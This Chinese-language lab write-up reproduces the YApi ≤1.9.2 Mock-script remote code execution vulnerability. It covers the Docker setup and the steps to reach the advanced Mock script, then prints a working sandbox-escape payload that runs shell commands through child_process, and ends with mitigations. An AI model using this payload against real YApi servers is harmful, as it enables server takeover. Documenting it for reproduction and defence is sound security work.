## 前言

本文内容是作者在平时漏洞复现时记录的笔记，内容参考了前辈的经验，如有侵权请联系我及时进行删除。

##  **影响范围**

YApi<=1.9.2

![1625885130_60e909caa3524ea6cc597.png!small?1625885129430](https://image.3001.net/images/20210710/1625885130_60e909caa3524ea6cc597.png!small?1625885129430)

##  **漏洞复现**

###  **环境搭建**

攻击机：Windows10

受害者：Kali Linux (ip:192.168.18.131)

Kali搭建YApi：

> git clone https://github.com/fjc0k/docker-YApi.git
>
> cd docker-YApi
>
> docker-compose up -d

###  **复现过程**

注册后点击添加项目

![1625885154_60e909e28b24bec85810a.png!small?1625885153340](https://image.3001.net/images/20210710/1625885154_60e909e28b24bec85810a.png!small?1625885153340)

![1625885161_60e909e9b84ead857c0a5.png!small?1625885160533](https://image.3001.net/images/20210710/1625885161_60e909e9b84ead857c0a5.png!small?1625885160533)

添加接口

![1625885179_60e909fb308665a68830d.png!small?1625885177987](https://image.3001.net/images/20210710/1625885179_60e909fb308665a68830d.png!small?1625885177987)

![1625885189_60e90a0526cfd39f0ac14.png!small?1625885187929](https://image.3001.net/images/20210710/1625885189_60e90a0526cfd39f0ac14.png!small?1625885187929)

点击高级Mock，选择脚本并开启，写入恶意代码并保存。

![1625885195_60e90a0b0ad380ebcacae.png!small?1625885193808](https://image.3001.net/images/20210710/1625885195_60e90a0b0ad380ebcacae.png!small?1625885193808)

![1625885203_60e90a13065fe6035fb1f.png!small?1625885201802](https://image.3001.net/images/20210710/1625885203_60e90a13065fe6035fb1f.png!small?1625885201802)

保存后点击浏览，访问Mock地址，漏洞利用成功

![1625885228_60e90a2cc834f95e609c1.png!small?1625885227608](https://image.3001.net/images/20210710/1625885228_60e90a2cc834f95e609c1.png!small?1625885227608)

![1625885233_60e90a3139b5eb9681ced.png!small?1625885232005](https://image.3001.net/images/20210710/1625885233_60e90a3139b5eb9681ced.png!small?1625885232005)

 **payload**

    
    
    const sandbox = this
    const ObjectConstructor = this.constructor
    const FunctionConstructor = ObjectConstructor.constructor
    const myfun = FunctionConstructor('return process')
    const process = myfun()
    mockJson = process.mainModule.require("child_process").execSync("whoami && ps -ef").toString()

##  **防御方案**

1、关闭YApi用户注册功能；

在"config.json"添加"closeRegister:true"配置项：

    
    
    {
    
    "port": "*****",
    
    "closeRegister":true
    
    }

修改完成后，重启YApi服务。

2、暂时关闭mock功能（需要修改YApi代码）；

在"config.json"中添加 "mock: false" ；

在"exts/yapi-plugin-andvanced-mock/server.js"中找到`if (caseData &&
caseData.case_enable) {...}`，在其上方添加`if(!yapi.WEBCONFIG.mock) {return false;}`。

3、白名单限制；

安全组配置白名单访问，或者使用NGINX进行代理，限制白名单IP访问；

4、检查用户列表，删除恶意不明用户；并删除恶意不明用户创建的接口及mock脚本。

##  **参考链接**

[
_https://mp.weixin.qq.com/s/je06efYE9PqB58xhOyo2TA_](https://mp.weixin.qq.com/s/je06efYE9PqB58xhOyo2TA)

[
_https://mp.weixin.qq.com/s/v5EIpH2VvsvrI1RFZiLOlA_](https://mp.weixin.qq.com/s/v5EIpH2VvsvrI1RFZiLOlA)

[ _https://github.com/fjc0k/docker-YApi_](https://github.com/fjc0k/docker-YApi)

  

